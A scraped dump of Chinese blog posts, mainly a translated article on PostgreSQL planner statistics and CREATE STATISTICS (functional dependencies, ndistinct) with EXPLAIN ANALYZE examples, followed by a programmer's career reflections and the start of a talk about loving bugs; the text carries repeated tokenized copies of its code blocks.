VACUUM（和一些 DDL 命令，比如说 CREATE INDEX )来采集或更新的。,\n,这些统计信息由 planner 存储在 ,pg_class, 和 ,pg_statistics, 中。Pg_class 基本上存储了每个表和索引中的条目总数，以及它们所占用的磁盘块数。Pg_statistic 存储关于每列的统计信息，例如哪些列的 % 值为 nul l，哪些是最常见的值，直方图边界等。你可以查看下面的示例，以了解 Postgres 在下表中为 col1 收集的统计信息类型。下面的查询输出展示了 planner（正确地）预估表中列 col1 中有 1000 个不同的值，并且还对最常见的值、频率等进行了其他预估。,\n,请注意，我们已经查询了 ,pg_stats,（一个拥有更多可读版本的列统计信息的视图）。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nCREATE TABLE tbl (                                                                        \r\n    col1 int,                                                                             \r\n    col2 int                                                                              \r\n);                                                                                        \r\n\r\nINSERT INTO tbl SELECT i/10000, i/100000                                                  \r\nFROM generate_series (1,10000000) s(i);                                                   \r\n\r\nANALYZE tbl;                                     \r\n\r\nselect * from pg_stats where tablename = 'tbl' and attname = 'col1';\r\n-[ RECORD 1 ]----------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\r\nschemaname             | public\r\ntablename              | tbl\r\nattname                | col1\r\ninherited              | f\r\nnull_frac              | 0\r\navg_width              | 4\r\nn_distinct             | 1000\r\nmost_common_vals       | {318,564,596,...}\r\nmost_common_freqs      | {0.00173333,0.0017,0.00166667,0.00156667,...}\r\nhistogram_bounds       | {0,8,20,30,39,...}\r\ncorrelation            | 1\r\nmost_common_elems      | \r\nmost_common_elem_freqs | \r\nelem_count_histogram   |,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,CREATE, ,TABLE, ,tbl, ,(,                                                                        ,    ,col1, ,int,,,                                                                             ,    ,col2, ,int,                                                                              ,),;,                                                                                        , ,INSERT, ,INTO, ,tbl, ,SELECT, ,i,/,10000,,, ,i,/,100000,                                                  ,FROM, ,generate,_,series ,(,1,,,10000000,), ,s,(,i,),;,                                                   , ,ANALYZE, ,tbl,;,                                     , ,select, ,*, ,from, ,pg,_,stats ,where, ,tablename, ,=, ,'tbl', ,and, ,attname, ,=, ,'col1',;,-,[, ,RECORD, ,1, ,],--,--,--,--,--,+,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,schemaname,             ,|, ,public,tablename,              ,|, ,tbl,attname,                ,|, ,col1,inherited,              ,|, ,f,null,_,frac              ,|, ,0,avg,_,width              ,|, ,4,n,_,distinct             ,|, ,1000,most_common,_,vals       ,|, ,{,318,,,564,,,596,,,.,.,.,},most_common,_,freqs      ,|, ,{,0.00173333,,,0.0017,,,0.00166667,,,0.00156667,,,.,.,.,},histogram,_,bounds       ,|, ,{,0,,,8,,,20,,,30,,,39,,,.,.,.,},correlation,            ,|, ,1,most_common,_,elems      ,|, ,most_common_elem,_,freqs ,|, ,elem_count,_,histogram   ,|,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,单列统计数据不足时,\n,这些单列统计信息可帮助 planner 估算你的条件选择性（这是 planner 用来估算,索引扫描,将选择多少行的内容）。 当查询中存在多个条件时，planner 假定列（或 where 子句条件）彼此独立。 当列相互关联或相互依赖并导致 planner 低估或高估这些条件将返回的行数时，就不适用。,\n,我们来看下面的几个例子。 为了使查询计划易于阅读，我们通过设置 max_parallel_workers_per_gather  为 0 来关闭每个查询的并行性：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nEXPLAIN ANALYZE SELECT * FROM tbl where col1 = 1;                            \r\n                                                QUERY PLAN                                                 \r\n-----------------------------------------------------------------------------------------------------------\r\n Seq Scan on tbl  (cost=0.00..169247.80 rows=9584 width=8) (actual time=0.641..622.851 rows=10000 loops=1)\r\n   Filter: (col1 = 1)\r\n   Rows Removed by Filter: 9990000\r\n Planning time: 0.051 ms\r\n Execution time: 623.185 ms\r\n(5 rows),\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,EXPLAIN, ,ANALYZE, ,SELECT, ,*, ,FROM, ,tbl, ,where, ,col1, ,=, ,1,;,                            ,                                                ,QUERY, ,PLAN,                                                 ,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,-, ,Seq, ,Scan, ,on, ,tbl,  ,(,cost,=,0.00..169247.80, ,rows,=,9584, ,width,=,8,), ,(,actual, ,time,=,0.641..622.851, ,rows,=,10000, ,loops,=,1,),   ,Filter,:, ,(,col1, ,=, ,1,),   ,Rows, ,Removed, ,by, ,Filter,:, ,9990000, ,Planning, ,time,:, ,0.051, ,ms, ,Execution, ,time,:, ,623.185, ,ms,(,5, ,rows,),\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,正如你看到的那样，planner 估计 col1 的值为 1 的行数是 9584 ，而查询返回的实际行数是 10000 ，所以相当准确。,\n,当你在 column 1 和 column 2 都包含过滤器时会发生什么情况。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nEXPLAIN ANALYZE SELECT * FROM tbl where col1 = 1 and col2 = 0;                            \r\n                                                QUERY PLAN                                                \r\n----------------------------------------------------------------------------------------------------------\r\n Seq Scan on tbl  (cost=0.00..194248.69 rows=100 width=8) (actual time=0.640..630.130 rows=10000 loops=1)\r\n   Filter: ((col1 = 1) AND (col2 = 0))\r\n   Rows Removed by Filter: 9990000\r\n Planning time: 0.072 ms\r\n Execution time: 630.467 ms\r\n(5 rows),\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,EXPLAIN, ,ANALYZE, ,SELECT, ,*, ,FROM, ,tbl, ,where, ,col1, ,=, ,1, ,and, ,col2, ,=, ,0,;,                            ,                                                ,QUERY, ,PLAN,                                                ,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--, ,Seq, ,Scan, ,on, ,tbl,  ,(,cost,=,0.00..194248.69, ,rows,=,100, ,width,=,8,), ,(,actual, ,time,=,0.640..630.130, ,rows,=,10000, ,loops,=,1,),   ,Filter,:, ,(,(,col1, ,=, ,1,), ,AND, ,(,col2, ,=, ,0,),),   ,Rows, ,Removed, ,by, ,Filter,:, ,9990000, ,Planning, ,time,:, ,0.072, ,ms, ,Execution, ,time,:, ,630.467, ,ms,(,5, ,rows,),\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,planner 的估计减少了100倍！ 让我们试着理解为什么发生这种情况。,\n第一个列的选择性约为 0.001（1/1000），第二个列的选择性为 0.01（1/100）。 要计算将由这两个“独立”条件过滤的行数，planner 会将它们的选择性相乘。 所以，我们得到：,\n,选择性= 0.001 * 0.01 = 0.00001。,\n,当它乘以我们在表中的行数即 10000000 时，我们得到 100。这就是 planner 对 100 的估计值的来源。 但是，这些列不是独立的，那么我们如何告知 planner ？,\n,在 PostgreSQL 中创建统计信息,\n,在 Postgres 10 之前，没有一种简易的方式去告诉 planner 采集捕捉列之间关系的数据统计。但是， Postgres 10 有一个新特性正好解决了这个问题，可以使用 ,CREATE STATISTICS, 来创建扩展统计的对象，告诉服务器去采集这些有意思的相关列的额外的统计信息。,\n,函数依赖统计,\n,回到我们先前评估的问题，col2 的值仅仅是 col1/10 。在数据库的术语中，我们会说 col2 是函数依赖于 col1 ，也就是说，col1 的值足以决定 col2 的值，并且不存在有两行数据拥有相同的 col1 值的同时有不同的 col2 值。因此，在 col2 列上的第二个过滤筛选并没有移除任何行！但是，planner 捕捉到了足够的统计信息去知道这件事情。,\n,让我们来创建一个统计对象去捕获这些列和运行分析（ANALYZE）所依赖的函数统计。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nCREATE STATISTICS s1 (dependencies) on col1, col2 from tbl; \r\nANALYZE tbl;,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,CREATE, ,STATISTICS, ,s1, ,(,dependencies,), ,on, ,col1,,, ,col2, ,from, ,tbl,;, ,ANALYZE, ,tbl,;,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n, ,\n,让我们来看看现在的计划是怎么来的。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nEXPLAIN ANALYZE SELECT * FROM tbl where col1 = 1 and col2 = 0;                            \r\n                                                QUERY PLAN                                                 \r\n-----------------------------------------------------------------------------------------------------------\r\n Seq Scan on tbl  (cost=0.00..194247.76 rows=9584 width=8) (actual time=0.638..629.741 rows=10000 loops=1)\r\n   Filter: ((col1 = 1) AND (col2 = 0))\r\n   Rows Removed by Filter: 9990000\r\n Planning time: 0.115 ms\r\n Execution time: 630.076 ms\r\n(5 rows),\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,EXPLAIN, ,ANALYZE, ,SELECT, ,*, ,FROM, ,tbl, ,where, ,col1, ,=, ,1, ,and, ,col2, ,=, ,0,;,                            ,                                                ,QUERY, ,PLAN,                                                 ,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,-, ,Seq, ,Scan, ,on, ,tbl,  ,(,cost,=,0.00..194247.76, ,rows,=,9584, ,width,=,8,), ,(,actual, ,time,=,0.638..629.741, ,rows,=,10000, ,loops,=,1,),   ,Filter,:, ,(,(,col1, ,=, ,1,), ,AND, ,(,col2, ,=, ,0,),),   ,Rows, ,Removed, ,by, ,Filter,:, ,9990000, ,Planning, ,time,:, ,0.115, ,ms, ,Execution, ,time,:, ,630.076, ,ms,(,5, ,rows,),\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n, ,\n,很好！让我们看一下对计划的测量。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nSELECT stxname, stxkeys, stxdependencies                                                  \r\n  FROM pg_statistic_ext                                                                   \r\n  WHERE stxname = 's1';   \r\nstxname | stxkeys |   stxdependencies    \r\n---------+---------+----------------------\r\n s1      | 1 2     | {\"1 => 2\": 1.000000}\r\n(1 row),\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,SELECT, ,stxname,,, ,stxkeys,,, ,stxdependencies,                                                  ,  ,FROM, ,pg_statistic,_,ext                                                                   ,  ,WHERE, ,stxname, ,=, ,'s1',;,   ,stxname, ,|, ,stxkeys, ,|,   ,stxdependencies,    ,--,--,--,--,-,+,--,--,--,--,-,+,--,--,--,--,--,--,--,--,--,--,--, ,s1,      ,|, ,1, ,2,     ,|, ,{,\"1 => 2\",:, ,1.000000,},(,1, ,row,),\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n, ,\n,看这里，我们可以看到， Postgres 意识到 col1 完全决定 col2 ，因此用系数1来捕获这些信息。现在，所有的查询都过滤这些列之后，计划将会得到更好的评估。,\n,ndistinct 统计,\n,函数依赖是你可以在列之间捕获的一种关系。 你可以捕获的另一种统计信息是一组列的不同值。 我们之前指出，planner 可以获取每列不同值的统计数字，但再次合并多列时，这些统计数据往往是错误的。,\n,这些不好的数据是在什么时候影响我们的呢？ 下面来看一个例子。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nEXPLAIN ANALYZE SELECT col1,col2,count(*) from tbl group by col1, col2;                   \r\n                                                         QUERY PLAN                                                          \r\n-----------------------------------------------------------------------------------------------------------------------------\r\n GroupAggregate  (cost=1990523.20..2091523.04 rows=100000 width=16) (actual time=2697.246..4470.789 rows=1001 loops=1)\r\n   Group Key: col1, col2\r\n   ->  Sort  (cost=1990523.20..2015523.16 rows=9999984 width=8) (actual time=2695.498..3440.880 rows=10000000 loops=1)\r\n         Sort Key: col1, col2\r\n         Sort Method: external sort  Disk: 176128kB\r\n         ->  Seq Scan on tbl  (cost=0.00..144247.84 rows=9999984 width=8) (actual time=0.008..665.689 rows=10000000 loops=1)\r\n Planning time: 0.072 ms\r\n Execution time: 4494.583 ms,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,EXPLAIN, ,ANALYZE, ,SELECT, ,col1,,,col2,,,count,(,*,), ,from, ,tbl, ,group, ,by, ,col1,,, ,col2,;,                   ,                                                         ,QUERY, ,PLAN,                                                          ,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,-, ,GroupAggregate,  ,(,cost,=,1990523.20..2091523.04, ,rows,=,100000, ,width,=,16,), ,(,actual, ,time,=,2697.246..4470.789, ,rows,=,1001, ,loops,=,1,),   ,Group, ,Key,:, ,col1,,, ,col2,   ,->,  ,Sort,  ,(,cost,=,1990523.20..2015523.16, ,rows,=,9999984, ,width,=,8,), ,(,actual, ,time,=,2695.498..3440.880, ,rows,=,10000000, ,loops,=,1,),         ,Sort, ,Key,:, ,col1,,, ,col2,         ,Sort, ,Method,:, ,external, ,sort,  ,Disk,:, ,176128kB,         ,->,  ,Seq, ,Scan, ,on, ,tbl,  ,(,cost,=,0.00..144247.84, ,rows,=,9999984, ,width,=,8,), ,(,actual, ,time,=,0.008..665.689, ,rows,=,10000000, ,loops,=,1,), ,Planning, ,time,:, ,0.072, ,ms, ,Execution, ,time,:, ,4494.583, ,ms,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,聚合行时，Postgres 选择做散列聚合或组合。 如果它认为散列表合适，则选择散列聚合，否则它会选择对所有行进行排序，然后按照 col1、col2 对它们进行分组。,\n,现在，planner 估计组的数量（等于 col1、col2 的不同值的数量）将为 100000。它预计到它没有足够的 work_mem 将该散列表存储在内存中。 因此，它使用基于磁盘的排序来运行该查询。 但是，正如在查询计划中所看到的那样，实际行数仅为 1001。也许，我们有足够的内存来执行哈希聚合。,\n,让 planner 去捕获 n_distinct 统计信息，重新运行查询并找出结果。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nCREATE STATISTICS s2 (ndistinct) on col1, col2 from tbl;                                  \r\nANALYZE tbl;\r\n\r\nEXPLAIN ANALYZE SELECT col1,col2,count(*) from tbl group by col1, col2;                   \r\n                                                      QUERY PLAN                                                       \r\n-----------------------------------------------------------------------------------------------------------------------\r\n HashAggregate  (cost=219247.63..219257.63 rows=1000 width=16) (actual time=2431.767..2431.928 rows=1001 loops=1)\r\n   Group Key: col1, col2\r\n   ->  Seq Scan on tbl  (cost=0.00..144247.79 rows=9999979 width=8) (actual time=0.008..643.488 rows=10000000 loops=1)\r\n Planning time: 0.129 ms\r\n Execution time: 2432.010 ms\r\n(5 rows),\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,CREATE, ,STATISTICS, ,s2, ,(,ndistinct,), ,on, ,col1,,, ,col2, ,from, ,tbl,;,                                  ,ANALYZE, ,tbl,;, ,EXPLAIN, ,ANALYZE, ,SELECT, ,col1,,,col2,,,count,(,*,), ,from, ,tbl, ,group, ,by, ,col1,,, ,col2,;,                   ,                                                      ,QUERY, ,PLAN,                                                       ,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,--,-, ,HashAggregate,  ,(,cost,=,219247.63..219257.63, ,rows,=,1000, ,width,=,16,), ,(,actual, ,time,=,2431.767..2431.928, ,rows,=,1001, ,loops,=,1,),   ,Group, ,Key,:, ,col1,,, ,col2,   ,->,  ,Seq, ,Scan, ,on, ,tbl,  ,(,cost,=,0.00..144247.79, ,rows,=,9999979, ,width,=,8,), ,(,actual, ,time,=,0.008..643.488, ,rows,=,10000000, ,loops,=,1,), ,Planning, ,time,:, ,0.129, ,ms, ,Execution, ,time,:, ,2432.010, ,ms,(,5, ,rows,),\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,可以看到，现在的估算精度更高了（即 1000 ），查询速度也提高了2倍左右。 通过运行下面的查询，我们可以看到 planner 学到了什么。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nSELECT stxkeys AS k, stxndistinct AS nd                                                   \r\n  FROM pg_statistic_ext                                                                   \r\n  WHERE stxname = 's2'; \r\n  k  |       nd       \r\n-----+----------------\r\n 1 2 | {\"1, 2\": 1000},\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,SELECT, ,stxkeys, ,AS, ,k,,, ,stxndistinct, ,AS, ,nd,                                                   ,  ,FROM, ,pg_statistic,_,ext                                                                   ,  ,WHERE, ,stxname, ,=, ,'s2',;, ,  ,k,  ,|,       ,nd,       ,--,--,-,+,--,--,--,--,--,--,--,--, ,1, ,2, ,|, ,{,\"1, 2\",:, ,1000,},\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,现实影响,\n,在实际的生产模式中，你总是会有某些与数据库不知道的相互依赖或关系的列。 以下是我们与 ,Citus, 客户见过的一些例子：,\n,\n,有月份，季度和年份的列，因为你希望在报告中显示按所有人分组的统计信息。,\n,地理层次之间的关系。 例如。 具有国家，州和城市的列，并由它们来过滤/分组。,\n,\n,这里的例子仅仅是在数据集中只有 10M 行的情况，并且我们已经看到，在存在相关列的情况下，使用 CREATE 统计信息可显着改善查询计划，并显示性能改进。在 Citus 使用案例中，我们有,客户,存储数十亿行数据，糟糕查询计划的影响可能非常严重。在上述示例中，当 planner 选择了一个糟糕的查询计划时，我们不得不为 10M 行做一个基于磁盘的分类。想象一下如果是数十亿行，那会有多糟糕。,\n, ,\n, ,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 1 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114232/", "url_object_id": "c22f24194b40ae376ad2e2d388945335", "front_image_path": "full/d925c992a1aa410e25f0bb681dae99423f162420.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2012/03/career.jpg"], "title": "一个安卓程序媛的人生经验", "create_time": "2018/07/27", "vote": "1", "bookmark": "1", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,孤独烟,   ,引言,\n,博主有一个差不多认识了9年的程序媛朋友，从09年读大一开始认识的，现在已经毕业五年，所以相识是九年。目前她就职于网龙、是一个做安卓组件开发的程序媛，,已婚,。本文基本上反应了她的心酸血泪史，经其同意，整理成文。为了方便描述，下面的第一人称”我”指的就是该妹纸本人。,\n,糊里糊涂的大学生涯,\n,高考毕业后，也不知道自己的兴趣是啥，稀里糊涂的报了一个专业，最后阴差阳错的来了一个电子类专业。来了这个专业后，发现了一个现象。,\n,大部分就读工科专业的妹纸，都是瞎选的，要么就是调剂。基本上，对本专业都缺乏一个了解。而且大部分抱着一个混学历的心态来读，都不知道自己将来要做什么,\n,(博主ps：博主明白强迫自己学一个自己不敢兴趣的科目是件多无聊的事情。所以针对这个现象，并不是很排斥，毕竟有些人的家境，并不需要太努力的奋斗。),\n,大一上，无外乎就是一些公共课什么的，计算机一级考的是一些关于word、excel等操作，和编程没有什么关系。所以严格算起来，第一次接触到编程，是在大一下学期的C语言课程。非常有意思的是，没接触过编程的我，最后计算机二级考试居然考了满分。当时，我就明白，我在编程方面有着一种天赋，起码不会排斥。,\n俗话说,\n,兴趣是最好的老师,\n,对编程有兴趣的我，本来应该在这个领域继续深造。然而在大二和大三并没有接触到其他语言，因此水平一直停滞不前。或许你会说，你可以去自学啊。这里要说一下，我在大学期间的性格是属于一种,需要外界给予一定压力和指导，才会去学习。, 换句话说，如果当初大一下的C语言不需要参加计算机二级考试，我就不会那么努力学习，不会发现自己在编程方面的天赋。因此大二和大三，仅仅满足于上课所传授的知识，沉溺于奖学金的优越感之中。,\n转眼间到了大四，那会是12年。记得11年的时候，NOKIA的塞班机基本上已经退出市场，android那会的火热程度就和现在的微服务一样，于是当时就想着毕业从事一个和android开发相关的工作。由于自己性格的原因，选了一个android的项目作为自己的毕业设计。前面也说了，我需要一定压力来逼迫自己，才会有动力去做。所以在自己没有任何JAVA基础的情况下，选android项目作为自己的毕业设计，也是希望逼迫自己学有所成。这里有一点需要注意，,\n,自学过程中最大的敌人，就是寂寞,\n,坦白说，在学习过程中，不止一次怕来不及，怕做不出来毕设，怕毕不了业，不止一次动过要去某宝买一个的念头。而且一个人默默的学习，遇到不会的，容易浮躁。当时只有一个信念,我一定能做出来。,\n,当一个人的心中有着更高的山峰想去攀登时,他就不会在意脚下的泥沼,他才可能用最平静的方式去面对一般人难以承受的痛苦,\n,最后的结果就是，我做出来了，是一个支持各种格式的手机端阅读器。有意思的是，这个项目当时拿到了优秀毕业设计。也因为这个项目找到了工作。(大家想想，面试的时候，直接掏出手机晒自己的项目，比简历上写一堆经验有意义的多了。),\n,懵懵懂懂的工作生涯,\n,工作时第一家公司，是一家创业小公司，做的是影城里头的那种，订票的APP。这里有几条经验其实需要和大家进行分享。,\n千万不要有如下想法,\n,因为我是女生，所以我编程水平不好也很正常。,\n我是安卓端的，不懂后端知识也没关系,\n,坦白说，我很讨厌女生有这种想法。人一旦有了这种想法，就给自己套上了一层枷锁，无法发挥出自己的潜力。我们必须承认一点，人都是有惰性的。而且经常会给自己的懒惰，找寻各种各样的合理的理由。比如，把这个电视剧看完，再开始学习，等等。总之，你只要给自己找了一个这样的理由，每次你偷懒的时候，都会以这种理由给自己洗脑。从此，技术水平止步不前，它会成为你不思进取的借口。,\n或许正是因为，自己没有给自己套上这层枷锁，在毕业后的一年内努力学习，于是跳槽进入了网龙。,\n,女程序员在工作过程中，受到优待。,\n,网上有一个图很出名，如下所示,\n,\n,这个情况在工作中，确实还是存在的。其实可能是因为开发行业，男生比较多的原因，女生会受到优待一些。基本上女程序员遇到问题，一些男程序员会加班给你调BUG，当然加班程度取决于颜值。至于男程序员们遇到问题，那就真的只能靠自己了。但是，大家要注意,\n,一些能百度到的问题，就不要去咨询同事,\n,这里就不得不说了，有些同事，特别是女同事吧。反正总爱问一些，比如环境怎么搭建这种问题。坦白说，这些问题，你问出去了，只会耽误老员工的时间。人家脾气好，跟你说。遇到一些脾气差的，索性就直接不理你了。总之，予人方便就是予己方便。像一些业务上的知识就是可以去问老员工，千万不要去问一些什么语法啊、环境搭建的问题。,\n,做好自己的职业规划,\n,男生和女生还是存在着很大的体力差距的，这个不得不承认。包括在很多长辈眼里，都是觉得:”女生嘛，找一个轻松的工作，将来嫁人就好了。”,\n这里我想说的是在当程序员的时候，还是要保持一种学习的热情。就我来说，目前还是这种学习的热情还是没有褪去。如果一旦发现自己的学习热情褪去，就可以思考一下自己是否能在开发的路上走的更远，是不是做管理会更合适呢？不过，不可否认，肯定会有一些直男癌患者，跟你说:”你们女生体力不行啊，什么什么的，就应该去切切图，做做产品啊，什么什么的。”对于这一切质疑，我们要要走自己的路。,\n有一句话叫做,\n,行亦禅,坐亦禅,语默动静体安然。,\n,大致意思就是，不论你在做什么事,心中感到自在安然，这就是禅。人生有很多痛苦都是因为别人的”中伤”，我们都避免不了心中会有疑虑，只要拥有一颗安详的心，别人就不可能在此作怪。,\n,注意护发,\n,当程序员后，一定要注意自己的发际线。女生也不例外，大家要注意保养。,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 1 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114236/", "url_object_id": "2c16502f87052a1459d6e26767dc37ac", "front_image_path": "full/18fc86594a34c2bebbefd765480669feb0504c69.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2014/06/2034139cf13a5d2840500f5a15322217.png"], "title": "程序员，热爱你的 bug", "create_time": "2018/07/26", "vote": "1", "bookmark": 0, "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,本文由 ,伯乐在线, - ,学以致用123, 翻译，,艾凌风, 校稿。未经许可，禁止转载！,英文出处：,Allison Kaptur,。欢迎加入,翻译组,。,2017 年 10 月初，我在贝洛奥里藏特(巴西) 的 Python Brasil 大会做了一个主题演讲。下面是这个演讲的笔记 。 ,这里,可以下载视频。,\n,我热爱 bug,\n,我现在是 Pilot.com 的高级工程师，为初创公司开发自动记账系统。在这之前，我在 Dropbox 的桌面客户端团队工作，后面我会讲到在那里工作时的一些小故事。在那之前，我是 Recurse Center 的一个推进者，Recurse Center 对于程序员的感觉很像写作者的隐居地。 我在大学学习的是天体物理学，在成为工程师之前在金融机构工作了几年。,\n,但是这些事情没有一件是重要的—你只需要记住我热爱 bug 就足够了。我热爱 bug 是因为它们非常有趣。它们富有戏剧性。一个大 bug 的查找过程曲折离奇。一个大 bug 很像一个很好的笑话或谜语，你期待一个输出，但结果却大相径庭。,\n,在这个讲演中，我将会讲述一些我热爱的 bug，解释我为什么如此热爱 